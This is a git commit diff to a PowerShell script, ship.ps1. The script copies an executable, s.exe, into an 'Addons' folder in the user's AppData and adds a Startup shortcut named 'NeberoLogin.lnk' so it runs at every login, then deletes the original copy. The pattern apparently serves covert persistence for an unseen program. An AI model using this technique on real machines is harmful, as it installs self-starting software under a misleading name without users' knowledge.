3019fbd71f5b304ecccfb341c4954608e9364332
DrunkenLyricist <69303628+DrunkenLyricist@users.noreply.github.com>
2022-07-18 18:21:06 +0530

    Update ship.ps1

--- ship.ps1
+++ ship.ps1
@@ -3,6 +3,6 @@ new-item C:\Users\$env:username\AppData\Roaming\Addons\ -itemtype directory
 Copy-Item s.exe C:\Users\$env:username\AppData\Roaming\Addons\
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NeberoLogin.lnk")
-$Shortcut.TargetPath = "C:\Users\$env:username\AppData\Roaming\s.exe"
+$Shortcut.TargetPath = "C:\Users\$env:username\AppData\Roaming\Addons\s.exe"
 $Shortcut.Save()
 Remove-Item s.exe
